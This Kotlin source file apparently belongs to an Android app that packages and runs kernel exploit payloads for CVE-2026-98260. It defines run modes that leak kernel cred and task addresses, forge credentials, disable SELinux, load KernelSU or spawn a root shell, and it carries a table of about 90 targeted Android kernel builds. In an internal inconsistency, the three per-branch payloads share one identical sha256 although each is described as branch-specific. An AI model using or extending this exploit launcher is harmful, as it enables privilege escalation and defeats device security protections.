package com.extractkit.app

/** 随 APK 打包的 payload（assets/payload 下），sha256 与上游 assets/SHA256SUMS 一致。 */
data class Payload(
    val name: String,
    val asset: String,
    val sha256: String,
    val note: String,
)

object Payloads {
    val UID0 = Payload(
        "cve-2026-98260-uid0",
        "payload/cve-2026-98260-uid0",
        "3ca0cabcda9b4024ca3ae6a77f8088c5572018c9aed620fd0e7a52967fef396e",
        "静态 arm64，POSIX timer UAF → fake cred → ksud late-load（dada 线）",
    )
    val ANDROID = Payload(
        "cve-2026-98260-android",
        "payload/cve-2026-98260-android",
        "22424ed0c30bbc4f17bfd1be0a38662575e2935dc43e416061beeeb99b2c8b24",
        "PIE，v4bel 原始 PoC 的 Android 移植（aio spray + oracle）",
    )
    /**
     * 「一种内核分支编一份 payload」：5.10 / 5.15 / 6.1 / 6.6 / 6.12 / 6.18 各一份，
     * 编译时 `-DEXPECT_FAMILY="<前缀>"`，跑在别的分支上会立刻
     * `[guard] payload built for … refusing to run`，不在布局不匹配的内核上写任何东西。
     * 同一分支内各 build 的结构偏移由 device.cfg 提供，不必再按内核分份。
     */
    val PER_FAMILY: Map<String, Payload> = mapOf(
        "6.1" to Payload(
            "cve-2026-98260-uid0-6.1",
            "payload/fam/cve-2026-98260-uid0-6.1",
            "7f10c0f54417a79cfa227f51d0633d4514d2165b4ae5623958a6e4be2247f3b7",
            "6.1.x 分支专用（含 cred site-hit 诊断）",
        ),
        "5.10" to Payload(
            "cve-2026-98260-uid0-5.10",
            "payload/fam/cve-2026-98260-uid0-5.10",
            "7f10c0f54417a79cfa227f51d0633d4514d2165b4ae5623958a6e4be2247f3b7",
            "5.10.x 分支专用：事件布局按该分支编死，跑错分支自行拒绝",
        ),
        "5.15" to Payload(
            "cve-2026-98260-uid0-5.15",
            "payload/fam/cve-2026-98260-uid0-5.15",
            "7f10c0f54417a79cfa227f51d0633d4514d2165b4ae5623958a6e4be2247f3b7",
            "5.15.x 分支专用：事件布局按该分支编死，跑错分支自行拒绝",
        ),
    )

}

/** 一个可执行模式：payload + 参数 + 成功标记。 */
data class Mode(
    val id: String,
    val label: String,
    val target: Payload,
    val extraPayloads: List<Payload>,
    val args: String,
    val successMarkers: List<String>,
    val timeoutSec: Long,
    /** true = 成功后进程必须驻留（页上承载着活着的 cred），千万不要 kill */
    val persists: Boolean,
    val selfCheckArgs: String?,
    val note: String,
    /** 非空表示这是一条链：按 id 顺序跑这些单步模式，任一步失败即中止 */
    val steps: List<String> = emptyList(),
) {
    val allPayloads: List<Payload> get() = listOf(target) + extraPayloads
}

object Modes {

    private val tracefsHint = "需要 tracefs 可读可写；先用只读模式确认环境"

    val ALL: List<Mode> = listOf(
        Mode(
            id = "check_uid0",
            label = "① 只读自检 · uid0 check",
            target = Payloads.UID0,
            extraPayloads = emptyList(),
            args = "check",
            successMarkers = listOf("[check] READY"),
            timeoutSec = 90,
            persists = false,
            selfCheckArgs = null,
            note = "不改任何内核数据。输出 direct map base 与 tracefs 可用性。$tracefsHint",
        ),
        Mode(
            id = "preflight_98260",
            label = "① 只读预检 · 98260 --preflight",
            target = Payloads.ANDROID,
            extraPayloads = emptyList(),
            args = "--preflight",
            successMarkers = listOf("PREFLIGHT_PASS"),
            timeoutSec = 90,
            persists = false,
            selfCheckArgs = null,
            note = "打印 BTF 偏移常量并对齐目标内核，不启动竞态。",
        ),
        Mode(
            id = "leak_uid0",
            label = "② 信息泄漏 · uid0 leak",
            target = Payloads.UID0,
            extraPayloads = emptyList(),
            args = "leak",
            successMarkers = listOf("leak-only run complete"),
            timeoutSec = 180,
            persists = false,
            selfCheckArgs = "check",
            note = "只读泄漏把 cred / task_struct 地址打出来，不改内核数据。",
        ),
        Mode(
            id = "selftest_uid0",
            label = "② 写原语自测 · uid0 selftest",
            target = Payloads.UID0,
            extraPayloads = emptyList(),
            args = "selftest",
            successMarkers = listOf("SELFTEST"),
            timeoutSec = 240,
            persists = false,
            selfCheckArgs = "check",
            note = "把 8 字节零写打在自己进程的页上，验证原语是否成立（不会动别的进程）。",
        ),
        Mode(
            id = "extract_uid0",
            label = "③ 提取 root · uid0 fake → KernelSU",
            target = Payloads.UID0,
            extraPayloads = emptyList(),
            args = "fake",
            successMarkers = listOf(
                "child report uid=0",
                "[ksu] late-load rc=0",
                "KSU_LOADED",
            ),
            timeoutSec = 420,
            persists = true,
            selfCheckArgs = "check",
            note = "fake cred + 关 SELinux + ksud late-load。成功后 exploit 进程会驻留，别 kill。",
        ),
        Mode(
            id = "extract_98260",
            label = "③ 提取 root · 98260 主链（aio spray）",
            target = Payloads.ANDROID,
            extraPayloads = emptyList(),
            args = "",
            successMarkers = listOf("uid=0", "ROOT"),
            timeoutSec = 600,
            persists = true,
            selfCheckArgs = "--preflight",
            note = "v4bel 路线的 Android 版：aio 环喷雾 + oracle 计时，成功后起 root shell。",
        ),
        Mode(
            id = "chain_uid0",
            label = "★ 一键：自检 → 提取（uid0）",
            target = Payloads.UID0,
            extraPayloads = emptyList(),
            args = "",
            successMarkers = emptyList(),
            timeoutSec = 0,
            persists = true,
            selfCheckArgs = null,
            note = "先跑 check_uid0 确认 READY，再跑 fake。任一步不过就停，不会硬上。",
            steps = listOf("check_uid0", "extract_uid0"),
        ),
        Mode(
            id = "chain_98260",
            label = "★ 一键：预检 → 提取（98260）",
            target = Payloads.ANDROID,
            extraPayloads = emptyList(),
            args = "",
            successMarkers = emptyList(),
            timeoutSec = 0,
            persists = true,
            selfCheckArgs = null,
            note = "preflight 通过才继续跑 aio spray 主链。",
            steps = listOf("preflight_98260", "extract_98260"),
        ),
    )

    fun byId(id: String): Mode = ALL.first { it.id == id }
}

/**
 * 已内置支持的内核（来自两个上游仓库的 kernel_profiles 里的 .conf 实测列表）。
 * 精确命中 → 直接用；同族 → 需要自己验证；其余 → 必须重新标定 payload。
 */
object KernelTable {

    enum class Level { EXACT, FAMILY, UNKNOWN }

    private val exact: Set<String> = setOf(
        // ---- 5.10 / 5.15 ----
        "5.10.236-android12-9-00014-gb97c62c4e7d1-ab13436420",
        "5.15.41-android13-8-g8dc4c75ab7d8-ab1673212412",
        "5.15.119-android13-8-g6ff5097ee32a-ab1764665171",
        "5.15.167-android13-8-00017-gb1f32b310a30-ab12826353",
        "5.15.178-android13-8-00025-g7feb0b0b7cd8-ab14134651",
        "5.15.189-android13-8-00004-g1c3825f8ac0a-ab14110541",
        "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
        "5.15.197-android13-8-o-01214-gbee5b6ef6244",
        "5.15.197-android13-8-o-g00d4e8e246c3",
        "5.15.206-android13-8-00056-g3f87b8704e9e-ab15683575",
        // ---- 6.1 ----
        "6.1.25-android14-11-maybe-dirty",
        "6.1.78-android14-11-gb6577b760481-ab12075023",
        "6.1.115-android14-11-ga2521ca27699-ab13294383",
        "6.1.118-android14-11-ga3b9c44908dd-ab13320413",
        "6.1.118-android14-11-gca0ef6d17716-ab13624819",
        "6.1.134-android14-11-maybe-dirty",
        "6.1.138-android14-11-g0c3d559bcd85-ab14529422",
        "6.1.138-android14-11-g151cf2b6bfbe-ab13719792",
        "6.1.138-android14-11-g2ecae636cf9b-ab14676408",
        "6.1.138-android14-11-g44bda9e8f6e9-ab13792638",
        "6.1.138-android14-11-g51f8c580613d-ab13911623",
        "6.1.138-android14-11-g6ab8c9a86a33-ab14396278",
        "6.1.138-android14-11-g965475777129-mi",
        "6.1.141-android14-11-o-gb6893081c037",
        "6.1.141-android14-11-o-gffc54a6d2287",
        "6.1.145-android14-11-g09f1c0074ad7-ab14226177",
        "6.1.145-android14-11-g11c274d0441f-ab14259673",
        "6.1.145-android14-11-g74d1702dab4d-ab14669069",
        "6.1.145-android14-11-g9b69cc399ae1-ab14819715",
        "6.1.145-android14-11-geaa643a2c0ee-ab14763719",
        "6.1.157-android14-11-g82d681c9b06b-ab14634535",
        "6.1.157-android14-11-ga8b0b542991e-ab15601211",
        "6.1.157-android14-11-gbd23337e42e-ab14791245",
        "6.1.157-android14-11-o-g00d81d97d759",
        "6.1.157-android14-11-o-g606246250429",
        "6.1.162-android14-11-g5e8b0cffebd1-ab15202165",
        "6.1.162-android14-11-g752d9c17787d-ab15574904",
        "6.1.162-android14-11-gce140c0e5bf5-ab15450923",
        // ---- 6.6 ----
        "6.6.30-android15-8-g24ffe62b0a0e-abogki387229724-4k",
        "6.6.30-android15-8-g54dcbfbef792-ab12368803-4k",
        "6.6.30-android15-8-g6b55ce738535-4k",
        "6.6.77-android15-8-g4a507830d890-ab13636293-4k",
        "6.6.77-android15-8-g63ce7556864c-ab13994517-4k",
        "6.6.77-android15-8-gca30f3b4bef6-abogki440974771-4k",
        "6.6.89-android15-8-g0889fe95bb10-ab14402178-4k",
        "6.6.89-android15-8-g096cdb6ecefc-ab14358676-4k",
        "6.6.89-android15-8-g42db9ecb036b-ab14487600-4k",
        "6.6.89-android15-8-g5a0ffb447c1d-ab13771415-4k",
        "6.6.89-android15-8-g8e4be6b47e40-ab14134548-4k",
        "6.6.89-android15-8-gb99b4586a3ee-ab13754593-4k",
        "6.6.89-android15-8-gf4dc45704e54-abogki446052083-4k",
        "6.6.92-android15-8-g3637f4904cf5-ab13944661-4k",
        "6.6.102-android15-8-gab8eb70a71b8-ab14350911-4k",
        "6.6.102-android15-8-gb01b41c2647c-ab15574720-4k",
        "6.6.102-android15-8-gfe76d1bc97fd-ab14689815-4k",
        "6.6.118-android15-8-g21be90ecfb5e-ab15480137-4k",
        "6.6.118-android15-8-g2e6b9c3812c5-ab15114928-4k",
        "6.6.118-android15-8-g608a629fedf7-ab15154340-4k",
        "6.6.118-android15-8-g93e223c276e7-abogki500782043-4k",
        "6.6.118-android15-8-g9bc34d5b0c79-abogki537459655-4k",
        "6.6.118-android15-8-gbf8cd367de7a-ab15314822-4k",
        "6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k",
        "6.6.118-android15-8-gc44b714366cc-abogki519650608-4k",
        "6.6.118-android15-8-ge56cf6b09cca-ab15511674-4k",
        "6.6.118-android15-8-ge58033dc8ea6-abogki498046332-4k",
        "6.6.118-android15-8-gebdfad32d749-ab15099304-4k",
        // boot.img 实测验证：7 个符号 + 3 处 call site 与源码常量逐位一致
        "6.6.118-android15-8-g554929766a0d-abogki544555896-4k",
        "6.6.127-android15-8-g3b723d0e8507-abogki558077879-4k",
        "6.6.127-android15-8-gb947b5758b2a-ab15580855-4k",
        // ---- 6.12 / 6.18 ----
        "6.12.23-android16-5-g16e473de48a3-abogki462654244-4k",
        "6.12.23-android16-5-g75e9b1c7ae7c-abogki463945075-4k",
        "6.12.23-android16-5-g82efd98459a2-ab14457512-4k",
        "6.12.23-android16-5-ga8f88ad96df3-ab13929693-4k",
        "6.12.23-android16-5-gb2a876903b49-ab14541642-4k",
        "6.12.23-android16-5-gf1bdb13583da-ab13761046-4k",
        "6.12.30-android16-5-g1750f757fabe-ab13938768-4k",
        "6.12.30-android16-5-g6e872b4863d6-ab13847919-4k",
        "6.12.38-android16-5-g1d46253471dd-ab15048002-4k",
        "6.12.38-android16-5-g3c4da6410bcb-ab13872285-4k",
        "6.12.38-android16-5-g665eafb62659-ab14778838-4k",
        "6.12.38-android16-5-g74ad46052215-ab14494108-4k",
        "6.12.38-android16-5-g844001fb8721-ab14552068-4k",
        "6.12.38-android16-5-gb575a0b6e647-ab14355190-4k",
        "6.12.69-android16-6-g242e1a07f878-ab15865446-4k",
        "6.18.21-android17-5-gf957accaf563-ab15926176-4k",
    )

    /** 同族前缀：版本号+android 分支一致，只是提交/CI 号不同，大概率可用但需实测。 */
    private val families: List<String> = listOf(
        "5.10.236-android12-9",
        "5.15.41-android13-8", "5.15.119-android13-8", "5.15.167-android13-8",
        "5.15.178-android13-8", "5.15.189-android13-8", "5.15.197-android13-8",
        "5.15.206-android13-8",
        "6.1.25-android14-11", "6.1.78-android14-11", "6.1.115-android14-11",
        "6.1.118-android14-11", "6.1.134-android14-11", "6.1.138-android14-11",
        "6.1.141-android14-11", "6.1.145-android14-11", "6.1.157-android14-11",
        "6.1.162-android14-11",
        "6.6.30-android15-8", "6.6.77-android15-8", "6.6.89-android15-8",
        "6.6.92-android15-8", "6.6.102-android15-8", "6.6.118-android15-8",
        "6.6.127-android15-8",
        "6.12.23-android16-5", "6.12.30-android16-5", "6.12.38-android16-5",
        "6.12.69-android16-6", "6.18.21-android17-5",
    )

    data class Match(val level: Level, val reason: String)

    fun match(release: String): Match {
        val r = release.trim()
        if (r.isEmpty()) return Match(Level.UNKNOWN, "读不到 uname -r")
        if (exact.contains(r)) return Match(Level.EXACT, "精确命中内置 profile")
        for (f in families) {
            if (r.startsWith(f)) return Match(Level.FAMILY, "同族匹配：$f（需实测）")
        }
        return Match(Level.UNKNOWN, "不在内置列表，payload 常量需要按本机 boot.img 重新标定")
    }

    val size: Int get() = exact.size
}
